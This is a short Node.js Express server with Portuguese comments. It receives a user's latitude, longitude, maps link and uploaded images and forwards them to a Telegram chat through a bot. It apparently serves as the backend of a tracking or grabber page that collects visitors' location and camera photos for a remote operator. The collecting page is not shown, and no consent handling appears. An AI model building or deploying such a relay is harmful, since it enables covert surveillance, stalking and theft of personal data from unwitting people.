// server.js
const express = require("express");
const bodyParser = require("body-parser");
const multer = require('multer');
const cors = require("cors");
const axios = require("axios");
const path = require('path');
const fs = require('fs');
const FormData = require('form-data');


const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(cors());
app.use(bodyParser.json());

// usernam: compro269_bot
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});


app.post('/send-image', upload.single('image'), async (req, res) => {
  if (!req.file) {
    return res.status(400).send('Nenhuma imagem recebida');
  }
  const filePath = path.join(__dirname, req.file.path);

  try {
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('photo', fs.createReadStream(filePath));

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    res.sendStatus(200);
  } catch (error) {
    console.error('Erro ao enviar para o Telegram:', error.response?.data || error.message);
    res.sendStatus(500);
  } finally {
    fs.unlinkSync(filePath); // Remove o arquivo temporário
  }
});

app.listen(80, () => {
  console.log("Servidor rodando na porta 80");
});